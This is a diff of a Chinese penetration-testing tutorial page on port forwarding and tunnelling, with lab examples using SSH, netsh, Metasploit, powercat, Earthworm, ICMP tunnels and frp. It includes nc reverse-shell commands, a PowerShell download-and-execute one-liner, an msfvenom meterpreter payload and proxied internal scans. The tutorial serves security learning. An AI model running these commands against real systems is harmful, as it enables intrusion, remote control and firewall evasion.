+<li>192.168.111.3执行转发：ssh -L 0.0.0.0:54321:10.0.0.3:80 <a href="mailto:root@10.0.0.3" target="_blank" rel="noopener">root@10.0.0.3</a></li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/35.png" alt></li>
-<li>192.168.100.1执行转发：ssh -L 7777:192.168.100.3:80 <a href="mailto:root@192.168.100.4" target="_blank" rel="noopener">root@192.168.100.4</a></li>
+<li>192.168.111.1访问192.168.111.3:54321</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/36.png" alt></li>
-<li>192.168.100.1访问本地7777端口</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/37.png" alt></li>
 </ol>
-<p><strong>例子三</strong></p>
+<p><strong>例子三：Host2访问Host5:80，Host2不能访问Host6，Host6能访问Host2、Host5</strong></p>
 <ol>
-<li><strong>主机：192.168.100.1、192.168.100.4、192.168.100.3</strong></li>
-<li><strong>同上，192.168.100.3网站禁止192.168.100.1访问</strong></li>
+<li><strong>主机：192.168.111.1、192.168.111.3/10.0.0.1、10.0.0.3/100.0.0.1、100.0.0.2</strong></li>
+<li>10.0.0.3执行命令：ssh -fgN -R (10.0.0.1:)23334:100.0.0.2:80 <a href="mailto:root@10.0.0.1" target="_blank" rel="noopener">root@10.0.0.1</a></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/38.png" alt></li>
+<li>10.0.0.1无法访问100.0.0.2，10.0.0.1访问10.0.0.1:23334</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/39.png" alt></li>
-<li>192.168.100.1访问192.168.100.4:7777</li>
-<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/40.png" alt></li>
-<li>192.168.100.1执行命令：ssh -R 192.168.100.4:7777:192.168.100.3:80 <a href="mailto:root@192.168.100.4" target="_blank" rel="noopener">root@192.168.100.4</a></li>
-<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/41.png" alt></li>
 </ol>
-<p><strong>例子四</strong></p>
+<p><strong>例子四：Host1通过Host2访问内网</strong></p>
 <ol>
-<li><strong>主机：10.0.0.2（内外网都通）、10.0.0.4（内网）</strong></li>
+<li><strong>主机：192.168.111.1、192.168.111.3/10.0.0.1、10.0.0.3</strong></li>
+<li>192.168.111.1执行转发：ssh -CNfg -D 22222 <a href="mailto:root@192.168.111.3" target="_blank" rel="noopener">root@192.168.111.3</a></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/40.png" alt></li>
+<li>设置动态转发前后192.168.111.1访问10.0.0.3:80</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/41.png" alt></li>
+<li>windows：proxifier设置代理server：</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/42.png" alt></li>
+<li>设置规则，指定app使用代理访问内网</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/43.png" alt></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/44.png" alt></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/45.png" alt></li>
+<li>Linux：</li>
 <li>下载<a href="https://github.com/haad/proxychains" target="_blank" rel="noopener">proxychains</a></li>
 <li>./configure</li>
 <li>sudo make &amp;&amp; make install</li>
 <li>修改配置文件./proxychains/src/proxychains.conf（或默认）</li>
-<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/45.png" alt></li>
-<li>再试试</li>
-<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/44.png" alt></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/101.png" alt><pre><code>&lt;?php print_r($_SERVER[&#39;REMOTE_ADDR&#39;]);
+echo &quot;\n&quot;;</code></pre></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/102.png" alt></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/103.png" alt></li>
 </ol>
+<hr>
 <h3 id="0x14-netsh端口转发"><a href="#0x14-netsh端口转发" class="headerlink" title="0x14 netsh端口转发"></a>0x14 netsh端口转发</h3><ol>
 <li>netsh，windows自带的工具，可以把本地任意一个TCP协议端口重定向到其他端口，或远程端口。</li>
 <li><strong>条件</strong></li>
@@ -1339,18 +1446,18 @@
 <p><strong>基本语句：</strong></p>
 <ol>
 <li><strong>添加</strong></li>
-<li>netsh interface portproxy add v4tov4 listenaddress=localhost listenport=port connectaddress=ip connectport=port</li>
+<li><code>netsh interface portproxy add v4tov4 listenaddress=localhost listenport=port connectaddress=ip connectport=port protocol=tcp</code></li>
 <li><strong>删除指定转发配置</strong></li>
-<li>netsh interface portproxy delete v4tov4 listenaddress=ip listenport=port</li>
+<li><code>netsh interface portproxy delete v4tov4 listenaddress=ip listenport=port</code></li>
 <li><strong>查看</strong></li>
-<li>netsh interface portproxy show all</li>
+<li><code>netsh interface portproxy show all</code></li>
 <li><strong>清除所有转发配置</strong></li>
-<li>netsh interface portproxy reset</li>
+<li><code>netsh interface portproxy reset</code></li>
 </ol>
 <p><strong>例子：</strong></p>
 <ol>
-<li>将非3389端口的流量重定向到3389端口</li>
-<li>netsh interface portproxy add v4tov4 listenaddress=localip listenport=33389 connectaddress=localip connectport=3389</li>
+<li>3389端口转发到33389端口</li>
+<li><code>netsh interface portproxy add v4tov4 listenaddress=localip listenport=33389 connectaddress=localip connectport=3389</code></li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/53.png" alt></li>
 <li>不成功则要确保防火墙允许新端口的传入连接。</li>
 <li>netsh advfirewall firewall add rule name=”forwarded_RDP_port=33389” protocol=TCP dir=in localport=33389 action=allow</li>
@@ -1358,14 +1465,8 @@
 <li>再查看转发配置netsh interface portproxy show all</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/55.png" alt></li>
 </ol>
-<h3 id="0x15-MSF端口转发"><a href="#0x15-MSF端口转发" class="headerlink" title="0x15 MSF端口转发"></a>0x15 MSF端口转发</h3><ol>
-<li>portfwd add -l 33389 -p 3389 -r 1.2.3.4 #-l：本地监听端口，-p：目标端口，-r：目标ip</li>
-<li><strong>RDP登录</strong></li>
-<li>rdesktop 127.0.0.1:8888</li>
-<li><strong>其他命令</strong></li>
-<li>portfwd list/delete/flush #列出/删除/清空</li>
-</ol>
-<h3 id="0x16-iptables端口转发"><a href="#0x16-iptables端口转发" class="headerlink" title="0x16 iptables端口转发"></a>0x16 iptables端口转发</h3><ol>
+<hr>
+<h3 id="0x15-iptables端口转发"><a href="#0x15-iptables端口转发" class="headerlink" title="0x15 iptables端口转发"></a>0x15 iptables端口转发</h3><ol>
 <li><p>开启转发功能（立即生效，重启失效）：<code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></p>
 </li>
 <li><p><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/76.png" alt></p>
@@ -1384,17 +1485,88 @@
 </li>
 </ol>
 <hr>
-<h2 id="0x20-NC-Ncat反弹shell"><a href="#0x20-NC-Ncat反弹shell" class="headerlink" title="0x20 NC/Ncat反弹shell"></a>0x20 NC/Ncat反弹shell</h2><ol>
+<h3 id="0x16-NC-Ncat反弹shell"><a href="#0x16-NC-Ncat反弹shell" class="headerlink" title="0x16 NC/Ncat反弹shell"></a>0x16 NC/Ncat反弹shell</h3><ol>
 <li>控制主机：192.168.100.1</li>
 <li>服务器：192.168.100.3</li>
 <li>控制主机监听端口：nc -lvp 8888 </li>
 <li>服务器反弹一个cmd终端：nc -e cmd.exe 192.168.100.1 8888 </li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/25.png" alt></li>
 <li>Linux版：nc IP port -e /bin/bash</li>
-<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/38.png" alt="nc帮助"></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/100.png" alt="nc帮助"></li>
 </ol>
 <hr>
-<h2 id="0x30-Windows之reGeorg与Proxifier"><a href="#0x30-Windows之reGeorg与Proxifier" class="headerlink" title="0x30 Windows之reGeorg与Proxifier"></a>0x30 Windows之<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a>与Proxifier</h2><ol>
+<h3 id="0x17-powercat"><a href="#0x17-powercat" class="headerlink" title="0x17 powercat"></a>0x17 powercat</h3><ol>
+<li><a href="https://github.com/besimorhino/powercat/blob/master/powercat.ps1" target="_blank" rel="noopener">https://github.com/besimorhino/powercat/blob/master/powercat.ps1</a></li>
+<li>powershell版NC</li>
+<li>远程执行命令：</li>
+<li><code>powershell &quot;iex(new-object system.net.webclient).downloadstring(&#39;http://URL/powercat.ps1&#39;);powercat -lp 8888 -e cmd&quot;</code></li>
+<li>远程执行命令(后台运行)：</li>
+<li><code>start /b powershell &quot;iex(new-object system.net.webclient).downloadstring(&#39;http://URL/powercat.ps1&#39;);powercat -lp 8888 -e cmd&quot;</code></li>
+<li>本地正向连接：<code>nc remote_IP 8888</code></li>
+</ol>
+<hr>
+<h3 id="0x18-Metasploit-Framework-meterpreter端口转发"><a href="#0x18-Metasploit-Framework-meterpreter端口转发" class="headerlink" title="0x18 Metasploit Framework/meterpreter端口转发"></a>0x18 Metasploit Framework/meterpreter端口转发</h3><ol>
+<li>portfwd list/delete/flush #列出/删除/清空</li>
+<li><code>portfwd add -l local_port -p remote_port -r remote_ip</code></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/87.png" alt> </li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/88.png" alt> </li>
+</ol>
+<p><strong>例子：192.168.111.3/10.0.0.1、10.0.0.2、10.0.0.3/100.0.0.1、100.0.0.2</strong></p>
+<ol>
+<li>生成后门：<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.0.0.1 lport=4444 -f elf &gt; /root/tmp/shell.elf</code></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/79.png" alt></li>
+<li>上传到10.0.0.3并执行，获取meterpreter反弹shell</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/80.png" alt></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/81.png" alt></li>
+<li>10.0.0.3:80/test.php<pre><code>&lt;?php
+print_r($_SERVER[&#39;REMOTE_ADDR&#39;]);
+echo &quot;\n&quot;;</code></pre></li>
+<li>将 10.0.0.1:8080 转发到 10.0.0.3:80</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/82.png" alt> </li>
+<li>10.0.0.1 正常访问 10.0.0.3 与转发后 访问 “10.0.0.3”</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/83.png" alt> </li>
+<li></li>
+<li><strong>RDP连接</strong></li>
+<li>正常连接</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/84.png" alt> </li>
+<li><code>portfwd add -l 3389 -p 3389 -r 10.0.0.2</code></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/85.png" alt> </li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/86.png" alt> </li>
+</ol>
+<hr>
+<h3 id="0x19-MSF-socks"><a href="#0x19-MSF-socks" class="headerlink" title="0x19 MSF socks"></a>0x19 MSF socks</h3><ol>
+<li><strong>socks相关模块</strong></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/89.png" alt> </li>
+<li><strong>一层代理</strong></li>
+<li>修改配置文件 proxychains.conf ，添加<code>socks4 10.0.0.1 1080</code></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/90.png" alt> </li>
+<li>验证是否代理成功：proxyresolv IP</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/91.png" alt></li>
+<li>10.0.0.1 socks代理访问 10.0.0.3/test.php</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/92.png" alt> </li>
+<li></li>
+<li><strong>二层代理</strong></li>
+<li>获取子网路由，无则添加路由：<code>run autoroute -s 100.0.0.0/24</code></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/93.png" alt> </li>
+<li>100.0.0.2/shell.php<pre><code>&lt;?php print_r($_SERVER[&#39;REMOTE_ADDR&#39;]);
+echo &quot;\n&quot;;</code></pre></li>
+<li>100.0.0.1访问100.0.0.2/shell.php</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/95.png" alt></li>
+<li>修改proxychains.conf配置文件：</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/96.png" alt> </li>
+<li>修改代理端口：</li>
+<li><code>set srvport 1081</code> </li>
+<li>socks代理访问</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/94.png" alt>  </li>
+<li>socks代理nmap扫描端口</li>
+<li><code>proxychains nmap -Pn -sT 100.0.0.2 -p1-1000</code></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/97.png" alt> </li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/98.png" alt> </li>
+<li>ssh通过代理登录</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/99.png" alt> </li>
+</ol>
+<hr>
+<h2 id="0x20-Windows之reGeorg与Proxifier"><a href="#0x20-Windows之reGeorg与Proxifier" class="headerlink" title="0x20 Windows之reGeorg与Proxifier"></a>0x20 Windows之<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a>与Proxifier</h2><ol>
 <li><strong>环境：</strong></li>
 <li>控制主机 192.168.100.1</li>
 <li>服务器 192.168.100.4，192.168.100.3</li>
@@ -1426,7 +1598,7 @@
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/21.png" alt></li>
 </ol>
 <hr>
-<h2 id="0x40-Linux之reGeorg-proxychains"><a href="#0x40-Linux之reGeorg-proxychains" class="headerlink" title="0x40 Linux之reGeorg+proxychains"></a>0x40 Linux之reGeorg+proxychains</h2><ol>
+<h2 id="0x30-Linux之reGeorg-proxychains"><a href="#0x30-Linux之reGeorg-proxychains" class="headerlink" title="0x30 Linux之reGeorg+proxychains"></a>0x30 Linux之reGeorg+proxychains</h2><ol>
 <li><strong>虚拟机环境：</strong></li>
 <li>kali，桥接模式IP：192.168.0.103</li>
 <li>windows server 2008，桥接模式IP：192.168.0.104，仅主机模式IP：192.168.10.4</li>
@@ -1451,11 +1623,11 @@
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/24.png" alt></li>
 </ol>
 <hr>
-<h2 id="0x50-ICMP隧道"><a href="#0x50-ICMP隧道" class="headerlink" title="0x50 ICMP隧道"></a>0x50 ICMP隧道</h2><ol>
+<h2 id="0x40-ICMP隧道"><a href="#0x40-ICMP隧道" class="headerlink" title="0x40 ICMP隧道"></a>0x40 ICMP隧道</h2><ol>
 <li>ICMP：Internet控制报文协议，是TCP/IP协议族中的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通，主机是否可达，路由是否可用等网络本身的消息。这些控制消息不传递用户数据。</li>
 <li>建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙。</li>
 </ol>
-<h3 id="0x51-icmpsh"><a href="#0x51-icmpsh" class="headerlink" title="0x51 icmpsh"></a>0x51 icmpsh</h3><ol start="3">
+<h3 id="0x41-icmpsh"><a href="#0x41-icmpsh" class="headerlink" title="0x41 icmpsh"></a>0x41 icmpsh</h3><ol start="3">
 <li>工具：<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></li>
 <li><strong>准备：</strong></li>
 <li>运行icmpsh前，先关闭本地系统的ICMP答复，因为icmpsh运行时代替系统本身的ping命令的应答程序。</li>
@@ -1470,7 +1642,8 @@
 <li>受害者执行：<code>icmpsh.exe -t 攻击者IP -d 500 -b 30 -s 128</code> #-t：攻击主机IP -d：延时 -b：空格数 -s：缓冲区大小</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/29.png" alt></li>
 </ol>
-<h3 id="0x52-ptunnel"><a href="#0x52-ptunnel" class="headerlink" title="0x52 ptunnel"></a>0x52 <a href="http://www.cs.uit.no/~daniels/PingTunnel/#download" target="_blank" rel="noopener">ptunnel</a></h3><ol>
+<hr>
+<h3 id="0x42-ptunnel"><a href="#0x42-ptunnel" class="headerlink" title="0x42 ptunnel"></a>0x42 <a href="http://www.cs.uit.no/~daniels/PingTunnel/#download" target="_blank" rel="noopener">ptunnel</a></h3><ol>
 <li>ptunnel，全称“Ping Tunnel”，利用ICMP协议构建通信隧道，实现端到端通信。</li>
 <li><strong>Linux安装ptunnel</strong></li>
 <li>apt-get install ptunnel</li>
@@ -1484,7 +1657,8 @@
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/63.png" alt></li>
 <li>未完<a href="https://www.freebuf.com/articles/network/242015.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/242015.html</a></li>
 </ol>
-<h2 id="0x60-frp"><a href="#0x60-frp" class="headerlink" title="0x60 frp"></a>0x60 <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a></h2><p><strong>ssh登录内网主机</strong></p>
+<hr>
+<h2 id="0x50-frp"><a href="#0x50-frp" class="headerlink" title="0x50 frp"></a>0x50 <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a></h2><p><strong>ssh登录内网主机</strong></p>
 <ol>
 <li><strong>主机：windows（外网）、10.0.0.2（内外网都通）、10.0.0.4（内网）</strong></li>
 <li>10.0.0.2配置文件frps.ini</li>
@@ -1505,7 +1679,8 @@
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/52.png" alt></li>
 <li>访问<a href="http://www.yourdomain.com:8080" target="_blank" rel="noopener">http://www.yourdomain.com:8080</a></li>
 </ol>
-<h2 id="0x70-Ngrok"><a href="#0x70-Ngrok" class="headerlink" title="0x70 Ngrok"></a>0x70 <a href="https://ngrok.com/" target="_blank" rel="noopener">Ngrok</a></h2><ol>
+<hr>
+<h2 id="0x60-Ngrok"><a href="#0x60-Ngrok" class="headerlink" title="0x60 Ngrok"></a>0x60 <a href="https://ngrok.com/" target="_blank" rel="noopener">Ngrok</a></h2><ol>
 <li><strong>ngrok</strong>，一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放。</li>
 <li>下载并获取Authtoken</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/57.png" alt></li>
@@ -1525,21 +1700,101 @@
 <li>ngrok.exe tcp 22</li>
 <li>ngrok.exe http 80</li>
 </ol>
-<h2 id="0x80-Earthworm-Proxychains"><a href="#0x80-Earthworm-Proxychains" class="headerlink" title="0x80 Earthworm+Proxychains"></a>0x80 Earthworm+Proxychains</h2><h2 id="0x90-端口复用"><a href="#0x90-端口复用" class="headerlink" title="0x90 端口复用"></a>0x90 端口复用</h2><h3 id="0x91-windows-WinRM端口复用"><a href="#0x91-windows-WinRM端口复用" class="headerlink" title="0x91 windows WinRM端口复用"></a>0x91 windows WinRM端口复用</h3><ol>
-<li>模拟场景：服务器只允许80和443为出入口。</li>
+<hr>
+<h2 id="0x70-Earthworm-Proxychains"><a href="#0x70-Earthworm-Proxychains" class="headerlink" title="0x70 Earthworm+Proxychains"></a>0x70 Earthworm+Proxychains</h2><ol>
+<li>Earthworm新版：<a href="http://rootkiter.com/Termite/" target="_blank" rel="noopener">http://rootkiter.com/Termite/</a></li>
+<li>使用命令：</li>
 </ol>
-<p><strong>利用原理与知识：</strong></p>
+<pre><code>有6种命令格式：ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran
+-l    本地监听端口
+-d    接收反弹IP
+-e     接收反弹端口
+-f    连接IP
+-g    连接端口
+#
+正向socks5服务器
+./ew -s ssocksd -l 1080 
+#
+反向socks5服务器
+./ew -s rcsocks -l 1080 -e 8888
+./ew -s rssocks -d IP -e 8888
+#
+多层代理
+./ew -s lcx_listen -l 1080 -e 8888
+./ew -s lcx_tran -l 1080 -f IP -g 9999
+./ew -s lcx_slave -d IP -e 8888 -f IP -g 9999
+#
+lcx_tran
+./ew -s ssocksd -l 9999
+./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
+#
+lcx_listen、lcx_slave
+./ew -s lcx_listen -l 1080 -e 8888
+./ew -s ssocksd -l 9999
+./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+#
+三级代理
+./ew -s rcsocks -l 1080 -e 8888
+./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+./ew -s lcx_listen -l 9999 -e 7777
+./ew -s rssocks -d 127.0.0.1 -e 7777
+#
+数据流量：socks5-&gt;1080-&gt;8888-&gt;9999-&gt;7777-&gt;rssocks</code></pre><p><strong>反向代理例子：本地10.0.0.1、服务器10.0.0.3/100.0.0.1、100.0.0.2</strong></p>
 <ol>
-<li>微软在windows server 2003中加入了http.sys（内核驱动程序），用于侦听http流量并根据URL进行处理，允许任意用户进程共享专用于HTTP流量的TCP端口。即：通过http.sys，多个进程将能够侦听同一个端口上的HTTP流量，只需要各自注册的url前缀不同即可。</li>
-<li><strong>列出所有URL的DACL：</strong><code>netsh http show urlacl</code></li>
-<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/64.png" alt></li>
-<li>5985对应http的端口，5986对应https的端口</li>
-<li>查看所有在HTTP.sys上注册过的url前缀：</li>
-<li><code>netsh http show servicestate</code></li>
-<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/65.png" alt></li>
-<li>WinRM服务，全称Windows Remote Management，能够实现在远程主机上执行命令，默认监听5985端口。</li>
-<li>HTTP Server API：使应用程序能够接收定向到URL的HTTP请求并发送HTTP响应。</li>
-<li>Windows Server 2008默认关闭WinRM服务，Windows Server 2012默认开启。</li>
+<li>本地开启监听：<code>./ew_for_linux64 -s rcsocks -l 8888 -e 7777</code></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/105.png" alt></li>
+<li>服务器执行：<code>./ew_for_linux64 -s rssocks -d 10.0.0.1 -e 7777</code></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/104.png" alt></li>
+<li>使用代理访问与不使用代理访问的区别：</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/106.png" alt></li>
+<li>可看出流量互相传输</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/107.png" alt></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/108.png" alt></li>
+<li>利用代理ssh连接100.0.0.0/24网段的主机</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/109.png" alt></li>
+<li>利用代理nmap扫描，报错<pre><code>nmap: netutil.cc:1319: int collect_dnet_interfaces(const intf_entry*, void*): Assertion `rc == 0&#39; failed.</code></pre></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/110.png" alt></li>
+<li>注释proxy_dns，前添加#，再扫描</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/111.png" alt></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/112.png" alt></li>
+<li>服务器记录</li>
